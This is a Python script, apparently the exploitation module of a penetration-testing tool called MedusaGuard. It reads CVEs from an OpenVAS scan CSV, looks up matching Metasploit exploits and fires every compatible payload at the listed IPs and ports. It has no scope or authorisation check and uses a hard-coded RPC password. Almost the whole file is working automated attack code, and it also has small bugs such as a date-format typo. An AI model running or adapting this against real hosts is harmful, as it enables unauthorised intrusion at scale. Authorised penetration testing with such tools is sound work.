import csv
import subprocess
import time
from datetime import *
from pymetasploit3.msfrpc import *
from pymetasploit3.msfconsole import *
from termcolor import colored

# Global Defines
connectest = False # Shortening of Connection Established, used to perpetuate the 'While' loop to reattempt connection to Metasploit RPC server should it fail.
connectfail = "Connection to the Metasploit RPC server has failed. Attempting again in 10 seconds."
exploitedcves = 0
incompatiblecves = 0
noexploitcve = 0 # Counter for number of CVEs found in the reports that do not correspond with an exploit in Metasploit.
nxcvelist = ['0']
rowcounter = 0

def cveexploitation(noexploitcve, nxcvelist, targetcve, targetip, targetport):
    global exploitedcves

    for cve in targetcve:
        cvematch = client.modules.search("type:exploit cve:" + cve) # Search Metasploit's internal database via the RPC server to identify any exploits that match the identified CVE from any scans.
        payloadfail = 0 # Counter for number of payloads that failed in testing for an exploit of a CVE. This is outside the lower loops as it needs to reset between CVEs.
        payloadpass = 0 # Counter for number of payloads that were successfully employed against a target. This is outside the lower loops as it needs to reset bewteen CVEs.

        if len(cvematch) > 0: # cvematch receiving a positive result has a len of 1, increasing this will cancel it out.
            exploitname = cvematch[0].get("fullname") # Results from cvematch are saved as an array of dictionaries, this will be the reference to read the exploit name from these.
            exploit = client.modules.use("exploit", exploitname)
            exploit["RHOSTS"] = targetip
            exploit["RPORT"] = targetport
            compatpayloads = exploit.targetpayloads() # Checks for all available payloads, lists them in an array.
            exploitedcves = exploitedcves + 1
            report.write("---------------------------------------- \n"
                         "[" + datetime.now().strftime('%Y:%m:%d %H:%M:%S') + "] Exploitable CVE Found: " + cve + "\n"
                         "[" + datetime.now().strftime('%Y:%m:%d %H:%M:%S') + "] Identified Exploit: " + exploitname + "\n"
                         "Target IP: " + targetip + "\n"
                         "Target Port: " + targetport + "\n \n")

            for payload in compatpayloads: # Iterate through each payload. Whilst the information gained from this is not much more useful, it can provide a greater understanding of the possibilities of the exploit.
                try:
                    exploit.execute(payload = payload)
                except ValueError: # Compatible payloads are not expected to fail
                    #print("Payload " + payload + " is incompatible with exploit " + exploitname  + ". Proceeding to next payload trial.")
                    payloadfail = payloadfail + 1
                else:
                    #print("Payload " + payload + " with exploit " + exploitname  + " was successful. Proceeding to next payload.")
                    payloadpass = payloadpass + 1

            payloadtotal = payloadpass + payloadfail
            report.write("[" + datetime.now().strftime('%Y:%m:%d %H:%M:%S') + "] Exploitation completed. \n"
                         "Payload Statistics: \n"
                         "Total: " + str(payloadtotal) + "\n"
                         "Successful: " + str(payloadpass) + "\n"
                         "Failed: " + str(payloadfail) + "\n"
                         "---------------------------------------- \n \n") # Closes off the section of an exploited CVE, preparing it for the next one.

        else: # This fires if the CVE does not match to any in Metasploit's Database
            #print(cve + " does not have a compatible exploit in Metasploit's database. Skipping.")
            noexploitcve = noexploitcve + 1
            nxcvelist += [cve]
                
# def nessusread():
# def niktoread():
# These are features that may be added in later reprisals, but are not components of the core module.

def openvasread(rowcounter):
    with open('/home/kali/Downloads/results.csv', "r") as csvfile: # First argument in brackets is the file path, can be manually or automatically set.
        openvasresults = csv.DictReader(csvfile)
        report.write("[" + datetime.now().strftime('%Y:%m:%s %H:%M:%S') + "] OpenVAS report opened and read successfully \n")
        for row in openvasresults:
            rowcounter = rowcounter + 1
            if row['CVEs'] != "": 
                # Using the presence of items in the CVE column as the filter to determine if an exploit is possible.
                # The criteria can be adjusted to allow for search results from other categories, such as operating systems, services etc., but is a much more extensive task than provided for here.
                targetip = row["IP"]
                targetport = row["Port"] # The port is generally unnecessary, but better safe than sorry.
                targetcve = row["CVEs"].split(",") # Any split should be manually determined by reading the CSV, then implemented here. Code is accurate for OpenVAS produced CSVs.
                # Use the above as standard defines across all imported CSV documents. Change the row[" "] to whatever appears in Row 1 (usually the column titles).
                cveexploitation(noexploitcve, nxcvelist, targetcve, targetip, targetport) # Call the exploitation component only as the last non-reporting argument of the row["CVEs"] != "" section.
            #else:
                #print("CVE not found on row " + str(rowcounter) + ". Proceeding.")

def reportcreation():
    global reportname
    global report
    
    # Opening segment of the report. 
    reportname = ('MedusaGuard Exploit Report ' + datetime.now().strftime('%Y-%m-%d %H-%M-%S') + '.txt')
    report = open(reportname, 'w') # Appending a path to the front of reportname will change the location it is saved. If the file does not exist, it will be made.
    report.write("Commencing MedusaGuard Exploitation component. \n"
                 "["  + datetime.now().strftime('%Y:%m:%d %H:%M:%S') + "] Start time of exploitation suite \n \n \n \n")

def reportfinalise(incompatiblecves):
    report.write("The following CVEs were detected, but Metasploit does not have an exploit to target these: \n")
    del nxcvelist[0]
    for nxcve in nxcvelist:
        incompatiblecves = incompatiblecves + 1
        report.write(nxcve + "\n")
    totalcves = incompatiblecves + exploitedcves
    report.write("\n \n \n \n"
                 "End of Report Summary \n"
                 "[" + datetime.now().strftime('%Y:%m:%d %H:%M:%S') + "] End time of exploitation suite \n"
                 "Total CVEs examined: " + str(totalcves) + "\n"
                 "Total exploited CVEs: " + str(exploitedcves) + "\n"
                 "Incompatible CVEs: " + str(incompatiblecves) + "\n")

def rpcconnect(connectest, connectfail):
    global client

    while connectest == False: # Connection failures cause multiple errors and are fatal. This loop exists to prevent exiting the try-block below until successful.
        try:
            client = MsfRpcClient("kali", port = 55553, ssl = True) # Changes to this must also be replicated in the subprocess.run command, else the connection will perpetually fail.
        except:
            print(connectfail)
            time.sleep(10)
            report.write("[" + datetime.now().strftime('%Y:%m:%d %H:%M:%S') + "] Connection to Metasploit RPC server failed \n")
        else:
            print("Successfully established a connection to the Metasploit RPC server. Beginning assessment of provided reports.")
            report.write("[" + datetime.now().strftime('%Y:%m:%d %H:%M:%S') + "] Successfully connected to the Metasploit RPC server \n \n \n \n")
            connectest = True

#
#
# Script begins running here
#
#
reportcreation()
subprocess.run(["msfrpcd -P kali"], shell = True) # Must be run as a shell command. Subproccess is replacing system and should be used in its stead. Shell = True is required, else the command will attempt to look for a directory.
rpcconnect(connectest, connectfail)
openvasread(rowcounter)
reportfinalise(incompatiblecves)
